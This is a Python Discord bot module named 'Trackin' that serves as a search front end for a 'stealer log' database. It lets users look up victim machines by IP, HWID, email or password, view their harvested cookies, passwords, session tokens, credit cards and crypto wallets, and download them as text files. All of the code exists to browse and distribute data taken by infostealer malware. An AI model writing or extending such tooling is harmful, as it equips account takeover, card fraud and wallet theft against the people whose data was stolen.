import discord
from discord.ext import commands
from discord import ui
import os
from database.db_manager import search_logs, get_log_by_id, get_stats, search_machines, get_machine_data, get_all_machines


EMBED_COLOR = 0xFFFFFF
FOOTER_TEXT = "Trackin"


def sanitize(text, max_len=20):
    if not text:
        return "Unknown"
    clean = "".join(c for c in text if c.isalnum() or c in "-_ ").strip()
    return clean[:max_len] if clean else "Unknown"


def sanitize_id(text, max_len=40):
    if not text:
        return "unknown"
    clean = "".join(c for c in text if c.isalnum() or c in "-_").strip()
    return clean[:max_len] if clean else "unknown"


def make_embed(title=None, description=None, fields=None):
    embed = discord.Embed(color=EMBED_COLOR)
    if title:
        embed.title = title
    if description:
        embed.description = description
    if fields:
        for name, value, inline in fields:
            embed.add_field(name=name, value=value, inline=inline)
    embed.set_footer(text=FOOTER_TEXT)
    return embed


class SearchModal(ui.Modal, title="Trackin Search"):
    keyword = ui.TextInput(
        label="Search",
        placeholder="IP, domain, HWID, computer name, email, password, token...",
        required=True,
        style=discord.TextStyle.short,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        kw = self.keyword.value.strip()
        if not kw:
            embed = make_embed(title="Trackin", description="Enter a search term.")
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        results, total = await search_logs(keyword=kw, limit=10, offset=0)
        view = SearchResultsView(results=results, total=total, keyword=kw, page=0, author_id=interaction.user.id)
        embed = build_results_embed(results, total, 0)
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)


class MachineModal(ui.Modal, title="Machine View"):
    computer_name = ui.TextInput(
        label="Computer Name",
        placeholder="e.g. DESKTOP-ABC1234",
        required=True,
        style=discord.TextStyle.short,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        name = self.computer_name.value.strip()
        if not name:
            embed = make_embed(title="Trackin", description="Enter a computer name.")
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        machines, total = await search_machines(keyword=name, limit=20, offset=0)
        if not machines:
            embed = make_embed(title="Trackin Machine View", description=f"No machines found matching **{name}**.")
            await interaction.followup.send(embed=embed, ephemeral=True)
            return

        if total == 1:
            machine = machines[0]
            all_logs = await get_machine_data(machine["computer_name"])
            embed = build_machine_embed(machine, all_logs)
            view = MachineDetailView(author_id=interaction.user.id, machine_name=machine["computer_name"], all_logs=all_logs)
            await interaction.followup.send(embed=embed, view=view, ephemeral=True)
        else:
            view = MachineListView(machines=machines, total=total, keyword=name, page=0, author_id=interaction.user.id)
            embed = build_machine_list_embed(machines, total, 0)
            await interaction.followup.send(embed=embed, view=view, ephemeral=True)


class DetailView(ui.View):
    def __init__(self, author_id: int, log_data: dict = None):
        super().__init__(timeout=120)
        self.author_id = author_id
        self.log_data = log_data or {}

    @ui.button(label="Download Log", style=discord.ButtonStyle.primary, custom_id="dl_log")
    async def dl_log(self, interaction: discord.Interaction, button: ui.Button):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        parts = []
        log = self.log_data
        parts.append(f"=== TRACKIN LOG #{log.get('id', '?')} ===")
        parts.append(f"IP: {log.get('ip', 'N/A')}")
        parts.append(f"HWID: {log.get('hwid', 'N/A')}")
        parts.append(f"Computer: {log.get('computer_name', 'N/A')}")
        parts.append(f"OS: {log.get('os', 'N/A')}")
        parts.append(f"Stealer: {log.get('stealer_type', 'Unknown')}")
        parts.append(f"File: {log.get('filename', 'N/A')}\n")
        if log.get("cookies"):
            parts.append("--- COOKIES ---")
            parts.append(log["cookies"])
            parts.append("")
        if log.get("passwords"):
            parts.append("--- PASSWORDS ---")
            parts.append(log["passwords"])
            parts.append("")
        if log.get("tokens"):
            parts.append("--- TOKENS ---")
            parts.append(log["tokens"])
            parts.append("")
        if log.get("credit_cards"):
            parts.append("--- CREDIT CARDS ---")
            parts.append(log["credit_cards"])
            parts.append("")
        if log.get("wallets"):
            parts.append("--- WALLETS ---")
            parts.append(log["wallets"])
        content = "\n".join(parts)
        file = discord.File(fp=__import__("io").BytesIO(content.encode()), filename=f"log_{log.get('id', '?')}.txt")
        await interaction.response.send_message(file=file, ephemeral=True)

    @ui.button(label="Back", style=discord.ButtonStyle.secondary, custom_id="detail_back")
    async def back_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer()
        await interaction.message.delete()


class MachineDetailView(ui.View):
    def __init__(self, author_id: int, machine_name: str, all_logs: list):
        super().__init__(timeout=120)
        self.author_id = author_id
        self.machine_name = machine_name
        self.all_logs = all_logs

    @ui.button(label="Download Cookies", style=discord.ButtonStyle.secondary, custom_id="dl_cookies")
    async def dl_cookies(self, interaction: discord.Interaction, button: ui.Button):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        lines = []
        for log in self.all_logs:
            if log.get("cookies"):
                lines.append(log["cookies"])
        content = "\n".join(lines) if lines else "No cookies found"
        file = discord.File(fp=__import__("io").BytesIO(content.encode()), filename=f"{self.machine_name}_cookies.txt")
        await interaction.response.send_message(file=file, ephemeral=True)

    @ui.button(label="Download Passwords", style=discord.ButtonStyle.secondary, custom_id="dl_passwords")
    async def dl_passwords(self, interaction: discord.Interaction, button: ui.Button):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        lines = []
        for log in self.all_logs:
            if log.get("passwords"):
                lines.append(log["passwords"])
        content = "\n".join(lines) if lines else "No passwords found"
        file = discord.File(fp=__import__("io").BytesIO(content.encode()), filename=f"{self.machine_name}_passwords.txt")
        await interaction.response.send_message(file=file, ephemeral=True)

    @ui.button(label="Download Tokens", style=discord.ButtonStyle.secondary, custom_id="dl_tokens")
    async def dl_tokens(self, interaction: discord.Interaction, button: ui.Button):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        lines = []
        for log in self.all_logs:
            if log.get("tokens"):
                lines.append(log["tokens"])
        content = "\n".join(lines) if lines else "No tokens found"
        file = discord.File(fp=__import__("io").BytesIO(content.encode()), filename=f"{self.machine_name}_tokens.txt")
        await interaction.response.send_message(file=file, ephemeral=True)

    @ui.button(label="Download All", style=discord.ButtonStyle.primary, custom_id="dl_all")
    async def dl_all(self, interaction: discord.Interaction, button: ui.Button):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        parts = []
        parts.append(f"=== TRACKIN: {self.machine_name} ===\n")
        ips = set()
        hwids = set()
        for log in self.all_logs:
            if log.get("ip"):
                ips.add(log["ip"])
            if log.get("hwid"):
                hwids.add(log["hwid"])
        parts.append(f"IPs: {', '.join(ips)}")
        parts.append(f"HWIDs: {', '.join(hwids)}")
        parts.append(f"OS: {self.all_logs[0].get('os', 'N/A')}")
        parts.append(f"Total Logs: {len(self.all_logs)}\n")
        for log in self.all_logs:
            if log.get("cookies"):
                parts.append(f"--- COOKIES ({log.get('filename', '')}) ---")
                parts.append(log["cookies"])
                parts.append("")
            if log.get("passwords"):
                parts.append(f"--- PASSWORDS ({log.get('filename', '')}) ---")
                parts.append(log["passwords"])
                parts.append("")
            if log.get("tokens"):
                parts.append(f"--- TOKENS ({log.get('filename', '')}) ---")
                parts.append(log["tokens"])
                parts.append("")
        content = "\n".join(parts)
        file = discord.File(fp=__import__("io").BytesIO(content.encode()), filename=f"{self.machine_name}_full.txt")
        await interaction.response.send_message(file=file, ephemeral=True)

    @ui.button(label="Back", style=discord.ButtonStyle.secondary, custom_id="machine_back")
    async def back_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer()
        await interaction.message.delete()


class MachineListView(ui.View):
    def __init__(self, machines, total, keyword, page, author_id):
        super().__init__(timeout=120)
        self.machines = machines
        self.total = total
        self.keyword = keyword
        self.page = page
        self.author_id = author_id
        self.update_buttons()

    def update_buttons(self):
        self.clear_items()
        max_page = max(0, (self.total - 1) // 20)
        if self.page > 0:
            btn = ui.Button(label="Previous", style=discord.ButtonStyle.secondary, custom_id="ml_prev")
            btn.callback = self.prev_callback
            self.add_item(btn)
        if self.page < max_page:
            btn = ui.Button(label="Next", style=discord.ButtonStyle.secondary, custom_id="ml_next")
            btn.callback = self.next_callback
            self.add_item(btn)
        for m in self.machines[:5]:
            raw_name = m["computer_name"] or "Unknown"
            btn = ui.Button(label=sanitize(raw_name), style=discord.ButtonStyle.primary, custom_id=f"mc_{sanitize_id(raw_name)}")
            btn.callback = self.machine_callback
            self.add_item(btn)

    async def prev_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        await interaction.response.defer()
        self.page -= 1
        self.machines, self.total = await search_machines(keyword=self.keyword, limit=20, offset=self.page * 20)
        self.update_buttons()
        embed = build_machine_list_embed(self.machines, self.total, self.page)
        try:
            await interaction.message.edit(embed=embed, view=self)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=self, ephemeral=True)

    async def next_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        await interaction.response.defer()
        self.page += 1
        self.machines, self.total = await search_machines(keyword=self.keyword, limit=20, offset=self.page * 20)
        self.update_buttons()
        embed = build_machine_list_embed(self.machines, self.total, self.page)
        try:
            await interaction.message.edit(embed=embed, view=self)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=self, ephemeral=True)

    async def machine_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        await interaction.response.defer()
        raw_id = interaction.data["custom_id"][3:]
        all_logs = await get_machine_data(raw_id)
        if not all_logs:
            return await interaction.followup.send("Machine not found.", ephemeral=True)
        name = all_logs[0].get("computer_name") or raw_id
        machine = {"computer_name": name, "log_count": len(all_logs), "ips": "", "hwids": "", "os_list": "", "stealer_types": ""}
        embed = build_machine_embed(machine, all_logs)
        view = MachineDetailView(author_id=self.author_id, machine_name=name, all_logs=all_logs)
        try:
            await interaction.message.edit(embed=embed, view=view)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=view, ephemeral=True)


class SearchResultsView(ui.View):
    def __init__(self, results, total, keyword, page, author_id):
        super().__init__(timeout=120)
        self.results = results
        self.total = total
        self.keyword = keyword
        self.page = page
        self.author_id = author_id
        self.update_buttons()

    def update_buttons(self):
        self.clear_items()
        max_page = max(0, (self.total - 1) // 10)
        if self.page > 0:
            prev_btn = ui.Button(label="Previous", style=discord.ButtonStyle.secondary, custom_id="prev_page")
            prev_btn.callback = self.prev_page_callback
            self.add_item(prev_btn)
        if self.page < max_page:
            next_btn = ui.Button(label="Next", style=discord.ButtonStyle.secondary, custom_id="next_page")
            next_btn.callback = self.next_page_callback
            self.add_item(next_btn)
        if self.results:
            for i, log in enumerate(self.results[:5]):
                btn = ui.Button(label=f"#{log['id']}", style=discord.ButtonStyle.primary, custom_id=f"log_{log['id']}")
                btn.callback = self.detail_callback
                self.add_item(btn)

    async def prev_page_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not your search.", ephemeral=True)
        await interaction.response.defer()
        self.page -= 1
        self.results, self.total = await search_logs(keyword=self.keyword, limit=10, offset=self.page * 10)
        self.update_buttons()
        embed = build_results_embed(self.results, self.total, self.page)
        try:
            await interaction.message.edit(embed=embed, view=self)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=self, ephemeral=True)

    async def next_page_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not your search.", ephemeral=True)
        await interaction.response.defer()
        self.page += 1
        self.results, self.total = await search_logs(keyword=self.keyword, limit=10, offset=self.page * 10)
        self.update_buttons()
        embed = build_results_embed(self.results, self.total, self.page)
        try:
            await interaction.message.edit(embed=embed, view=self)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=self, ephemeral=True)

    async def detail_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not your search.", ephemeral=True)
        await interaction.response.defer()
        button_label = interaction.data["custom_id"]
        log_id = int(button_label.split("_")[1])
        log = await get_log_by_id(log_id)
        if not log:
            return await interaction.followup.send("Log not found.", ephemeral=True)
        embed = build_detail_embed(log)
        view = DetailView(author_id=self.author_id, log_data=log)
        try:
            await interaction.message.edit(embed=embed, view=view)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=view, ephemeral=True)


def build_results_embed(results, total, page):
    max_page = max(0, (total - 1) // 10) if total > 0 else 0

    if not results:
        return make_embed(title="Trackin Search Results", description="No results found.")

    lines = []
    for log in results:
        ip = log.get("ip") or "N/A"
        hwid = (log.get("hwid") or "N/A")[:20]
        name = (log.get("computer_name") or "N/A")[:18]
        stype = log.get("stealer_type") or "Unknown"
        lines.append(f"`{log['id']}` | {ip} | {hwid} | {name} | {stype}")

    embed = make_embed(title="Trackin Search Results", description="\n".join(lines))
    embed.add_field(name="Results", value=f"{total} total", inline=True)
    embed.add_field(name="Page", value=f"{page + 1}/{max_page + 1}", inline=True)
    embed.set_footer(text="Click a button to view full log")
    return embed


def build_machine_list_embed(machines, total, page):
    max_page = max(0, (total - 1) // 20) if total > 0 else 0

    if not machines:
        return make_embed(title="Trackin Machines", description="No machines found.")

    lines = []
    for m in machines:
        name = m.get("computer_name") or "N/A"
        count = m.get("log_count", 0)
        ips = (m.get("ips") or "N/A")[:40]
        lines.append(f"**{name}** - {count} logs | {ips}")

    embed = make_embed(title="Trackin Machines", description="\n".join(lines))
    embed.add_field(name="Results", value=f"{total} machines", inline=True)
    embed.add_field(name="Page", value=f"{page + 1}/{max_page + 1}", inline=True)
    embed.set_footer(text="Click a machine to view all data")
    return embed


def build_machine_embed(machine, all_logs):
    name = machine.get("computer_name") or "N/A"
    log_count = len(all_logs)

    all_ips = set()
    all_hwids = set()
    all_os = set()
    all_types = set()
    all_cookies = []
    all_passwords = []
    all_tokens = []
    all_cc = []
    all_wallets = []

    for log in all_logs:
        if log.get("ip"):
            all_ips.add(log["ip"])
        if log.get("hwid"):
            all_hwids.add(log["hwid"])
        if log.get("os"):
            all_os.add(log["os"])
        if log.get("stealer_type"):
            all_types.add(log["stealer_type"])
        if log.get("cookies"):
            all_cookies.append(log["cookies"])
        if log.get("passwords"):
            all_passwords.append(log["passwords"])
        if log.get("tokens"):
            all_tokens.append(log["tokens"])
        if log.get("credit_cards"):
            all_cc.append(log["credit_cards"])
        if log.get("wallets"):
            all_wallets.append(log["wallets"])

    MAX_FIELD = 1000

    fields = []
    fields.append(("Computer Name", f"`{name[:80]}`", True))
    fields.append(("Total Logs", f"`{log_count}`", True))

    os_str = ", ".join(list(all_os)[:3])[:60] if all_os else "N/A"
    fields.append(("OS", f"`{os_str}`", True))

    types_str = ", ".join(list(all_types)[:3])[:60] if all_types else "Unknown"
    fields.append(("Stealer Types", f"`{types_str}`", True))

    ips_str = ", ".join(list(all_ips)[:10])
    if len(ips_str) > MAX_FIELD:
        ips_str = ips_str[:MAX_FIELD]
    fields.append(("All IPs", f"`{ips_str}`" if ips_str else "`N/A`", False))

    hwids_str = ", ".join(list(all_hwids)[:5])
    if len(hwids_str) > MAX_FIELD:
        hwids_str = hwids_str[:MAX_FIELD]
    fields.append(("All HWIDs", f"`{hwids_str}`" if hwids_str else "`N/A`", False))

    if all_cookies:
        combined = "\n".join(all_cookies)
        preview = combined[:MAX_FIELD]
        fields.append(("All Cookies", f"```\n{preview}\n```", False))

    if all_passwords:
        combined = "\n".join(all_passwords)
        preview = combined[:MAX_FIELD]
        fields.append(("All Passwords", f"```\n{preview}\n```", False))

    if all_tokens:
        combined = "\n".join(all_tokens)
        preview = combined[:MAX_FIELD]
        fields.append(("All Tokens", f"```\n{preview}\n```", False))

    if all_cc:
        combined = "\n".join(all_cc)
        preview = combined[:MAX_FIELD]
        fields.append(("All Credit Cards", f"```\n{preview}\n```", False))

    if all_wallets:
        combined = "\n".join(all_wallets)
        preview = combined[:MAX_FIELD]
        fields.append(("All Wallets", f"```\n{preview}\n```", False))

    embed = make_embed(title=f"Machine: {name}", fields=fields)
    return embed


def build_detail_embed(log):
    fields = []
    fields.append(("IP Address", f"`{log.get('ip') or 'N/A'}`", True))
    fields.append(("HWID", f"`{log.get('hwid') or 'N/A'}`", True))
    fields.append(("Computer Name", f"`{log.get('computer_name') or 'N/A'}`", True))
    fields.append(("OS", f"`{log.get('os') or 'N/A'}`", True))
    fields.append(("Stealer Type", f"`{log.get('stealer_type') or 'Unknown'}`", True))
    fields.append(("Filename", f"`{log.get('filename') or 'N/A'}`", True))

    MAX_FIELD = 1000

    cookies = log.get("cookies") or ""
    if cookies:
        preview = cookies[:MAX_FIELD]
        fields.append(("Cookies", f"```\n{preview}\n```", False))

    passwords = log.get("passwords") or ""
    if passwords:
        preview = passwords[:MAX_FIELD]
        fields.append(("Passwords", f"```\n{preview}\n```", False))

    tokens = log.get("tokens") or ""
    if tokens:
        preview = tokens[:MAX_FIELD]
        fields.append(("Tokens", f"```\n{preview}\n```", False))

    credit_cards = log.get("credit_cards") or ""
    if credit_cards:
        preview = credit_cards[:MAX_FIELD]
        fields.append(("Credit Cards", f"```\n{preview}\n```", False))

    wallets = log.get("wallets") or ""
    if wallets:
        preview = wallets[:MAX_FIELD]
        fields.append(("Wallets", f"```\n{preview}\n```", False))

    embed = make_embed(title=f"Log #{log['id']}", fields=fields)
    return embed


class MainView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label="Search Logs", style=discord.ButtonStyle.primary, custom_id="trackin_search_btn")
    async def search_button(self, interaction: discord.Interaction, button: ui.Button):
        modal = SearchModal()
        await interaction.response.send_modal(modal)

    @ui.button(label="Machine View", style=discord.ButtonStyle.secondary, custom_id="trackin_machine_btn")
    async def machine_button(self, interaction: discord.Interaction, button: ui.Button):
        modal = MachineModal()
        await interaction.response.send_modal(modal)

    @ui.button(label="All Machines", style=discord.ButtonStyle.secondary, custom_id="trackin_all_machines_btn")
    async def all_machines_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.defer(ephemeral=True)
        machines, total = await get_all_machines(limit=20, offset=0)
        if not machines:
            embed = make_embed(title="Trackin Machines", description="No machines in database.")
            return await interaction.followup.send(embed=embed, ephemeral=True)
        view = AllMachinesView(machines=machines, total=total, page=0, author_id=interaction.user.id)
        embed = build_all_machines_embed(machines, total, 0)
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)


class AllMachinesView(ui.View):
    def __init__(self, machines, total, page, author_id):
        super().__init__(timeout=120)
        self.machines = machines
        self.total = total
        self.page = page
        self.author_id = author_id
        self.update_buttons()

    def update_buttons(self):
        self.clear_items()
        max_page = max(0, (self.total - 1) // 20)
        if self.page > 0:
            btn = ui.Button(label="Previous", style=discord.ButtonStyle.secondary, custom_id="am_prev")
            btn.callback = self.prev_callback
            self.add_item(btn)
        if self.page < max_page:
            btn = ui.Button(label="Next", style=discord.ButtonStyle.secondary, custom_id="am_next")
            btn.callback = self.next_callback
            self.add_item(btn)
        for m in self.machines[:5]:
            raw_name = m["computer_name"] or "Unknown"
            btn = ui.Button(label=sanitize(raw_name), style=discord.ButtonStyle.primary, custom_id=f"amc_{sanitize_id(raw_name)}")
            btn.callback = self.machine_callback
            self.add_item(btn)

    async def prev_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        await interaction.response.defer()
        self.page -= 1
        self.machines, self.total = await get_all_machines(limit=20, offset=self.page * 20)
        self.update_buttons()
        embed = build_all_machines_embed(self.machines, self.total, self.page)
        try:
            await interaction.message.edit(embed=embed, view=self)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=self, ephemeral=True)

    async def next_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        await interaction.response.defer()
        self.page += 1
        self.machines, self.total = await get_all_machines(limit=20, offset=self.page * 20)
        self.update_buttons()
        embed = build_all_machines_embed(self.machines, self.total, self.page)
        try:
            await interaction.message.edit(embed=embed, view=self)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=self, ephemeral=True)

    async def machine_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author_id:
            return await interaction.response.send_message("Not yours.", ephemeral=True)
        await interaction.response.defer()
        raw_id = interaction.data["custom_id"][4:]
        all_logs = await get_machine_data(raw_id)
        if not all_logs:
            return await interaction.followup.send("Machine not found.", ephemeral=True)
        name = all_logs[0].get("computer_name") or raw_id
        machine = {"computer_name": name, "log_count": len(all_logs), "ips": "", "hwids": "", "os_list": "", "stealer_types": ""}
        embed = build_machine_embed(machine, all_logs)
        view = MachineDetailView(author_id=self.author_id, machine_name=name, all_logs=all_logs)
        try:
            await interaction.message.edit(embed=embed, view=view)
        except (discord.NotFound, discord.HTTPException):
            await interaction.followup.send(embed=embed, view=view, ephemeral=True)


def build_all_machines_embed(machines, total, page):
    max_page = max(0, (total - 1) // 20) if total > 0 else 0

    lines = []
    for m in machines:
        name = m.get("computer_name") or "N/A"
        count = m.get("log_count", 0)
        ips = (m.get("ips") or "N/A")[:40]
        lines.append(f"**{name}** - {count} logs | {ips}")

    embed = make_embed(title="All Machines", description="\n".join(lines))
    embed.add_field(name="Total", value=f"{total} machines", inline=True)
    embed.add_field(name="Page", value=f"{page + 1}/{max_page + 1}", inline=True)
    embed.set_footer(text="Click a machine to view all data")
    return embed


class TrackinSearch(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="setup")
    @commands.has_permissions(administrator=True)
    async def setup(self, ctx):
        channel_id = int(os.getenv("CHANNEL_ID", 0))
        channel = self.bot.get_channel(channel_id)
        if not channel:
            await ctx.send("Invalid CHANNEL_ID in .env")
            return

        total, unique_ips, unique_hwids = await get_stats()

        embed = make_embed(
            title="Trackin",
            description=(
                "**Stealer Log Search Database**\n\n"
                "**How to use:**\n"
                "1. **Search Logs** - Search by IP, domain, email, HWID, password, token, etc.\n"
                "2. **Machine View** - Enter a computer name to see all its data\n"
                "3. **All Machines** - Browse every computer in the database\n"
                "4. Click any result to view full details\n\n"
                f"**Database:** {total:,} logs | {unique_ips:,} IPs | {unique_hwids:,} HWIDs"
            )
        )
        embed.set_footer(text=FOOTER_TEXT)

        view = MainView()
        await channel.send(embed=embed, view=view)
        await ctx.send(f"Search embed sent to <#{channel_id}>")

    @commands.command(name="stats")
    async def stats(self, ctx):
        total, unique_ips, unique_hwids = await get_stats()
        embed = make_embed(
            title="Trackin Stats",
            fields=[
                ("Total Logs", f"{total:,}", True),
                ("Unique IPs", f"{unique_ips:,}", True),
                ("Unique HWIDs", f"{unique_hwids:,}", True),
            ]
        )
        await ctx.send(embed=embed)

    @commands.command(name="search")
    async def search_cmd(self, ctx):
        modal = SearchModal()
        await ctx.send_modal(modal)

    @commands.command(name="machine")
    async def machine_cmd(self, ctx):
        modal = MachineModal()
        await ctx.send_modal(modal)

    @commands.command(name="machines")
    async def machines_cmd(self, ctx):
        machines, total = await get_all_machines(limit=20, offset=0)
        if not machines:
            return await ctx.send("No machines in database.")
        view = AllMachinesView(machines=machines, total=total, page=0, author_id=ctx.author.id)
        embed = build_all_machines_embed(machines, total, 0)
        await ctx.send(embed=embed, view=view)


async def setup(bot):
    await bot.add_cog(TrackinSearch(bot))
